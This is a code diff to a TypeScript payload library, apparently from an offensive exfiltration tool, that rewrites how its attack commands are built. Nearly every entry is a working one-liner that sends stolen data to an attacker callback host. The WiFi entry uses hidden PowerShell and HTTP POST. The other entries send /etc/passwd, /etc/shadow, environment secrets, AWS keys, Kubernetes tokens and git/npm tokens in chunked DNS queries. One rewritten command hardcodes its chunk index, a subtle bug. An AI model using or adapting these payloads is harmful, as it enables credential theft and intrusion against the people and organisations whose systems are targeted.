@@ -235,7 +235,7 @@ export function buildHttpExfil(cbUrl: string, token: string): ExfilPayload[] {
     {
       id: "win_ps_wifi", name: "PowerShell — WiFi Passwords", category: "Windows",
       technique: "https", os: "windows",
-      command: `powershell -NonI -W Hidden -c "$w=(netsh wlan show profiles|Select-String 'All User Profile').ForEach{$n=($_ -split ':')[1].Trim();(netsh wlan show profile name=$n key=clear|Select-String 'Key Content').ForEach{\"$n : $($_ -split ':')[1].Trim()\"}};[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($w-join\"`n\"))|Invoke-WebRequest '${cb}?f=wifi' -Method POST -UseBasicParsing 2>$null"`,
+      command: `powershell -NonI -W Hidden -c "$w=(netsh wlan show profiles|Select-String 'All User Profile').ForEach{$n=($_ -split ':')[1].Trim();(netsh wlan show profile name=$n key=clear|Select-String 'Key Content').ForEach{\"$n : $($_ -split ':')[1].Trim()\"}};[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($w-join[char]10)))|Invoke-WebRequest '${cb}?f=wifi' -Method POST -UseBasicParsing 2>$null"`,
       notes: "Dumps all saved WiFi passwords in plaintext.",
     },
     {
@@ -261,45 +261,63 @@ export function buildDnsExfil(cbUrl: string, token: string): ExfilPayload[] {
     {
       id: "dns_passwd_dig", name: "/etc/passwd — dig chunked", category: "Credentials",
       technique: "dns", os: "linux",
-      command: `f=$(base64 -w0 /etc/passwd 2>/dev/null || base64 /etc/passwd | tr -d '\\n'); i=0; len=${#f}; while [ $i -lt $len ]; do chunk="${f:$i:55}"; dig "${chunk}.${i}.p.${token}.${host}" @8.8.8.8 +short +time=1 2>/dev/null; i=$((i+55)); sleep 0.15; done`,
+      command:
+        "f=$(base64 -w0 /etc/passwd 2>/dev/null || base64 /etc/passwd | tr -d '\\n'); i=0; " +
+        "while [ $i -lt ${#f} ]; do chunk=${f:$i:55}; " +
+        "dig \"$chunk." + "0" + ".p." + token + "." + host + "\" @8.8.8.8 +short +time=1 2>/dev/null; " +
+        "i=$((i+55)); sleep 0.15; done",
       notes: "Sends /etc/passwd in 55-char base64 chunks over DNS. Slow but bypasses all HTTP controls.",
     },
     {
       id: "dns_passwd_nslookup", name: "/etc/passwd — nslookup single chunk", category: "Credentials",
       technique: "dns", os: "linux",
-      command: `nslookup "$(base64 -w0 /etc/passwd 2>/dev/null | cut -c1-60).p.${token}.${host}" 2>/dev/null`,
+      command:
+        "nslookup \"$(base64 -w0 /etc/passwd 2>/dev/null | cut -c1-60).p." +
+        token + "." + host + "\" 2>/dev/null",
       notes: "Single nslookup — only exfils first 60 base64 chars (~45 bytes). Good for confirming OOB.",
     },
     {
       id: "dns_env_dig", name: "ENV Secrets — dig chunked", category: "Secrets",
       technique: "dns", os: "linux",
-      command: `f=$(env | grep -iE '(pass|secret|key|token|api|cred|auth|db|jwt)' | base64 -w0 2>/dev/null || env | base64 | tr -d '\\n'); i=0; while [ $i -lt ${#f} ]; do dig "${f:$i:55}.${i}.e.${token}.${host}" +short +time=1 2>/dev/null; i=$((i+55)); sleep 0.1; done`,
+      command:
+        "f=$(env | grep -iE '(pass|secret|key|token|api|cred|auth|db|jwt)' | base64 -w0 2>/dev/null || env | base64 | tr -d '\\n'); i=0; " +
+        "while [ $i -lt ${#f} ]; do chunk=${f:$i:55}; " +
+        "dig \"$chunk.$i.e." + token + "." + host + "\" +short +time=1 2>/dev/null; " +
+        "i=$((i+55)); sleep 0.1; done",
       notes: "Exfiltrates only secret-looking env vars via DNS — minimises chunks needed.",
     },
     {
       id: "dns_aws_env", name: "AWS Credentials — dig", category: "Cloud",
       technique: "dns", os: "linux",
-      command: `f=$(env | grep -iE '^AWS_' | base64 -w0 2>/dev/null); i=0; while [ $i -lt ${#f} ]; do dig "${f:$i:55}.${i}.aws.${token}.${host}" @8.8.8.8 +short +time=1 2>/dev/null; i=$((i+55)); sleep 0.1; done`,
+      command:
+        "f=$(env | grep -iE '^AWS_' | base64 -w0 2>/dev/null); i=0; " +
+        "while [ $i -lt ${#f} ]; do chunk=${f:$i:55}; " +
+        "dig \"$chunk.$i.aws." + token + "." + host + "\" @8.8.8.8 +short +time=1 2>/dev/null; " +
+        "i=$((i+55)); sleep 0.1; done",
       notes: "AWS env vars (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN) over DNS.",
     },
     {
       id: "dns_k8s_token", name: "K8s SA Token — dig chunked", category: "Container",
       technique: "dns", os: "linux",
-      command: `f=$(base64 -w0 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); i=0; while [ $i -lt ${#f} ]; do dig "${f:$i:55}.${i}.k.${token}.${host}" +short +time=1 2>/dev/null; i=$((i+55)); sleep 0.1; done`,
+      command:
+        "f=$(base64 -w0 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null); i=0; " +
+        "while [ $i -lt ${#f} ]; do chunk=${f:$i:55}; " +
+        "dig \"$chunk.$i.k." + token + "." + host + "\" +short +time=1 2>/dev/null; " +
+        "i=$((i+55)); sleep 0.1; done",
       notes: "K8s service account JWT via DNS. JWT = 3 base64 parts — can be decoded offline.",
     },
     {
       id: "dns_python_chunk", name: "Python — chunked DNS exfil", category: "Secrets",
       technique: "dns", os: "linux",
-      command: `python3 -c "
-import subprocess,base64,os,time
-d=base64.b64encode(b'\\n'.join([open(f,'rb').read() for f in ['/etc/passwd','/proc/self/environ',os.path.expanduser('~/.aws/credentials')] if os.path.exists(f)])).decode()
-for i in range(0,len(d),55):
-    chunk=d[i:i+55].replace('+','-').replace('/','_').replace('=','~')
-    subprocess.run(['dig',f'{chunk}.{i}.py.${token}.${host}','@8.8.8.8','+short','+time=1'],capture_output=True)
-    time.sleep(0.12)
-print('done',len(d),'chars')
-"`,
+      command:
+        "python3 -c \"" +
+        "import subprocess,base64,os,time\\n" +
+        "d=base64.b64encode(b'\\\\n'.join([open(f,'rb').read() for f in ['/etc/passwd','/proc/self/environ',os.path.expanduser('~/.aws/credentials')] if os.path.exists(f)])).decode()\\n" +
+        "for i in range(0,len(d),55):\\n" +
+        "    chunk=d[i:i+55].replace('+','-').replace('/','_').replace('=','~')\\n" +
+        "    subprocess.run(['dig',f'{chunk}.{i}.py." + token + "." + host + "','@8.8.8.8','+short','+time=1'],capture_output=True)\\n" +
+        "    time.sleep(0.12)\\n" +
+        "print('done',len(d),'chars')\\n\"",
       notes: "Python multi-target exfil: /etc/passwd + /proc/self/environ + AWS creds in one chunked DNS stream.",
     },
     {
@@ -317,13 +335,19 @@ print('done',len(d),'chars')
     {
       id: "dns_shadow_chunked", name: "/etc/shadow — dig chunked (root)", category: "Credentials",
       technique: "dns", os: "linux",
-      command: `f=$(sudo base64 -w0 /etc/shadow 2>/dev/null || base64 -w0 /etc/shadow 2>/dev/null); i=0; while [ $i -lt ${#f} ]; do dig "${f:$i:55}.${i}.s.${token}.${host}" +short +time=1 2>/dev/null; i=$((i+55)); sleep 0.15; done`,
+      command:
+        "f=$(sudo base64 -w0 /etc/shadow 2>/dev/null || base64 -w0 /etc/shadow 2>/dev/null); i=0; " +
+        "while [ $i -lt ${#f} ]; do chunk=${f:$i:55}; " +
+        "dig \"$chunk.$i.s." + token + "." + host + "\" +short +time=1 2>/dev/null; " +
+        "i=$((i+55)); sleep 0.15; done",
       notes: "Exfiltrates /etc/shadow hashes via DNS. Requires root. Each chunk = ~41 plaintext bytes.",
     },
     {
       id: "dns_git_token", name: "Git + NPM Tokens — quick DNS", category: "Secrets",
       technique: "dns", os: "linux",
-      command: `f=$(grep -ohE '[a-zA-Z0-9_-]{30,}' ~/.git-credentials ~/.npmrc ~/.pypirc 2>/dev/null | head -3 | base64 -w0 2>/dev/null | cut -c1-55); [ -n "$f" ] && dig "${f}.tok.${token}.${host}" +short 2>/dev/null`,
+      command:
+        "f=$(grep -ohE '[a-zA-Z0-9_-]{30,}' ~/.git-credentials ~/.npmrc ~/.pypirc 2>/dev/null | head -3 | base64 -w0 2>/dev/null | cut -c1-55); " +
+        "[ -n \"$f\" ] && dig \"$f.tok." + token + "." + host + "\" +short 2>/dev/null",
       notes: "Greps high-entropy tokens from common credential files, exfils via single DNS query.",
     },
     {
